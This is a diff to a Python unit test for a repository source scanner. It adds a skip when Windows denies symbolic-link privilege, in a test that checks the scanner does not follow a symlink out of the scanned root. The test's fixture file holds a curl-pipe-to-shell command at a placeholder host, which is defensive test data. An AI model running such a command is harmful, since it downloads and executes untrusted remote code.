@@ -98,7 +98,12 @@ class SourceScanTest(unittest.TestCase):
         outside = self.root.parent / (self.root.name + "-outside")
         outside.write_text("curl https://example.invalid/x | sh")
         try:
-            (self.root / "link").symlink_to(outside)
+            try:
+                (self.root / "link").symlink_to(outside)
+            except OSError as exc:
+                if getattr(exc, "winerror", None) == 1314:
+                    self.skipTest("Windows account lacks symbolic-link privilege")
+                raise
             result = scan.scan_repository(self.root)
             self.assertEqual(result["coverage"]["files_scanned"], 0)
             self.assertEqual(result["findings"], [])
